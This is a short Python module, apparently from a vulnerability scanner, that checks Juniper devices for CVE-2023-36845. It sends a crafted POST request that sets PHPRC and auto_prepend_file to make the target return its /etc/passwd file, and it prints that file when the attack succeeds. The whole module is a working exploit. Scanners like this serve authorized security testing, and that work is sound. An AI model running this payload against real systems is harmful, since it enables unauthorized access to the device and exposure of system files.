#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
urllib3.disable_warnings()
class Cve_2023_36845:
    def main(self,target):
        OutPrintInfo("Juniper", '开始检测Juniper任意代码执行漏洞')
        url = target[0].strip("/ ")
        ssl = target[1]
        header = target[2]
        proxy = target[3]

        req = ReqSet(header=header, proxy=proxy)
        headers = req["header"]
        proxies = req["proxy"]
        req_url = f"{url}/?PHPRC=/dev/fd/0"
        try:
            response = requests.post(req_url, data={'auto_prepend_file': '/etc/passwd'}, verify=ssl, timeout=5,headers=headers,proxies=proxies)
            response.encoding = response.apparent_encoding
            if 'root:' in response.text:
                OutPrintInfo("Juniper", '[b bright_red]存在Juniper任意代码执行漏洞')
                OutPrintInfo("Juniper", response.text)
            else:
                OutPrintInfo("Juniper", '不存在Juniper任意代码执行漏洞')
        except requests.RequestException as e:
            pass




        OutPrintInfo("Juniper", 'Juniper任意代码执行漏洞检测结束')